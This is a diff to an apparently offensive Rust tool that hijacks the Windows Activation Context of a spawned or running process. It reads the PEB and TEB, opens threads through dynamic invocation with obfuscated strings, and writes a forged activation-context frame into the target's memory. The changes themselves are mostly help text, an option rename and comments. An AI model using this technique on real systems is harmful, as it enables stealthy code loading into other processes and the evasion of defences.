@@ -27,7 +27,7 @@ impl Default for RtlActivationContextFrame {
         RtlActivationContextFrame {
             _previous: ptr::null_mut(),
             activation_context: ptr::null_mut(),
-            flags: 0xC
+            flags: 0xC // Important
         }
     }
 }
@@ -79,18 +79,17 @@ impl Default for FrameListWrapper {
 // 528 bytes from the struct pointed by (handle - 8) returned by CreateActCtxW 
 const TOTAL_SIZE: usize = size_of::<FrameListWrapper>() + 528;
 
-
 fn main() 
 {
     let args: Vec<String> = env::args().collect();
     let program = args[0].clone();
     let mut opts = Options::new();
-    opts.reqopt("m", "mode", ".", "");
+    opts.reqopt("m", "mode", "Hijack the Activation Context of a new (spawn) or an already running (hijack) process.", "");
     opts.optflag("h", "help", "Print this help menu.");
-    opts.optopt("b", "binary", ".", "");
-    opts.optopt("p", "manifest-path", "", "");
-    opts.optopt("r", "resource-number", r"Path in which to write the log file [default: C:\Windows\Temp\result.log].", "");
-    opts.optopt("i", "pid", r"Path in which to write the log file [default: C:\Windows\Temp\result.log].", "");
+    opts.optopt("b", "binary", ".", "Absolute path of the executable used to spawn the new process.");
+    opts.optopt("f", "manifest-file", "", "Path of the manifest path to use to create the new Activation Context.");
+    opts.optopt("r", "resource-number", r"Resource index of the current executable where the manifest is located.", "");
+    opts.optopt("i", "pid", r"ID of the process whose Activation Context is to be hijacked.", "");
 
     let matches = match opts.parse(&args[1..]) 
     {
@@ -104,7 +103,7 @@ fn main()
         return;
     }
 
-    if !matches.opt_present("p") && !matches.opt_present("r")
+    if !matches.opt_present("f") && !matches.opt_present("r")
     {
         print_usage(&program, opts);
         return;
@@ -119,7 +118,7 @@ fn main()
     if matches.opt_present("r") {
         resource_index = matches.opt_str("r").unwrap().parse().unwrap();
     } else {
-        manifest_path = matches.opt_str("p").unwrap();
+        manifest_path = matches.opt_str("f").unwrap();
     }
 
     if mode == "spawn".to_string() 
@@ -269,7 +268,7 @@ fn hijack_process(process_handle: HANDLE, thread_handle: HANDLE, ac_struct_ptr: 
     {
         let k32 = dinvoke_rs::dinvoke::get_module_base_address(&lc!("kernel32.dll"));
 
-        // Get process' PEB base address
+        // Get process PEB base address
         let pi = PROCESS_BASIC_INFORMATION::default();
         let process_information: *mut c_void = std::mem::transmute(&pi);
         let ret = dinvoke_rs::dinvoke::nt_query_information_process(
@@ -441,7 +440,7 @@ fn hijack_process_or_thread(pid: u32, resource_index: u32, manifest_path: String
         let tid = get_main_thread_id(pid);
         if tid == 0 
         {
-            println!("{}", &lc!("[x] Main thread not found. Fallback to process hijack."));
+            println!("{}", &lc!("[x] Main thread not found. Fallback to process' Activation Context hijack."));
 
             let h = HANDLE::default();
             let handle_ptr: *mut HANDLE = std::mem::transmute(&h);
@@ -475,7 +474,7 @@ fn hijack_process_or_thread(pid: u32, resource_index: u32, manifest_path: String
         let client_id = ClientId {unique_process: HANDLE::default(), unique_thread: HANDLE{0: tid as isize}};
         let client_id: *mut ClientId = std::mem::transmute(&client_id);
         let desired_access = 0x0800 ; // THREAD_QUERY_LIMITED_INFORMATION 
-        let function: dinvoke_rs::data::NtOpenProcess; // NtOpenThread receives the same arguments as NtOpenProcess, so we can use the same function prototype
+        let function: dinvoke_rs::data::NtOpenProcess; // NtOpenThread expects the same type of arguments as NtOpenProcess, so we can use the same function prototype
         let ret: Option<i32>;
         dinvoke_rs::dinvoke::dynamic_invoke!(ntdll,"NtOpenThread",function,ret,thread_handle_ptr,desired_access,object_attributes,client_id);
 
@@ -539,7 +538,7 @@ fn hijack_process_or_thread(pid: u32, resource_index: u32, manifest_path: String
             return;
         } 
 
-        if (*teb_ptr).ActivationStack.ActiveFrame == ptr::null_mut() { // Main thread doesn't have a custom AC, meaning we can hijack the process main AC
+        if (*teb_ptr).ActivationStack.ActiveFrame == ptr::null_mut() { // Main thread doesn't have a custom AC, meaning we can hijack the process' main AC
             println!("\t\\{}", &lc!("[!] Main thread does not have a custom AC enabled. Hijacking process' main AC."));
             hijack_process(*process_handle_ptr, HANDLE::default(), dst, dwsize, false);
             return;
@@ -569,19 +568,19 @@ fn hijack_process_or_thread(pid: u32, resource_index: u32, manifest_path: String
         frame_list_wrapper.list_elements[0].activation_context_frame.activation_context = (*base_address as usize + total_offset + size_of::<FrameListWrapper>() + 8) as *mut _; 
         frame_list_wrapper.list_elements[0].activation_context_frame.flags = 0x28;
 
-        // I think this is how the cookie is calculated, but in any case this value does not impact in any way to the hijacking process 
+        // This is how the cookie returned by CreateActCtx is calculated, but in any case this value does not impact in any way to the hijacking process 
         frame_list_wrapper.list_elements[0].cookie = (*teb_ptr).ActivationStack.NextCookieSequenceNumber as u64 | (((*teb_ptr).ActivationStack.StackId as u64 & 0xFFFFFFF) << 32) | 0x1000000000000000;
         let ptr_offset = dst.add(total_offset) as *mut FrameListWrapper;
         *ptr_offset = frame_list_wrapper;
 
         let handle_dst_ptr_start = ptr_offset.add(1) as *mut u8;
-        copy_nonoverlapping((context_handle.0 as usize - 8) as *mut u8, handle_dst_ptr_start, 528); // We copy the handle after the ACTIVATION_CONTEXT_STACK list
+        copy_nonoverlapping((context_handle.0 as usize - 8) as *mut u8, handle_dst_ptr_start, 528); // We copy the handle right after the ACTIVATION_CONTEXT_STACK list
 
         let handle_dst_ptr: *mut usize = handle_dst_ptr_start as *mut usize;
         let handle_dst_ptr: *mut usize = handle_dst_ptr.add(4);
         *handle_dst_ptr = *base_address as usize; 
         
-        // I don't know what this is for or if it's completely correct, but probably it's not needed at all
+        // I don't know what this is for or if it's completely correct, but it's probably not needed at all
         let unknown_ptr = handle_dst_ptr_start.add(128) as *mut usize;
         *unknown_ptr = *base_address as usize + total_offset + size_of::<FrameListWrapper>() + 136; 
 
@@ -654,7 +653,7 @@ fn get_main_thread_id(pid: u32) -> u32
 
         loop 
         {
-            if te32.th32OwnerProcessID == pid {
+            if te32.th32OwnerProcessID == pid { // First thread is usually the process' main thread
                 return te32.th32ThreadID;
             }
 
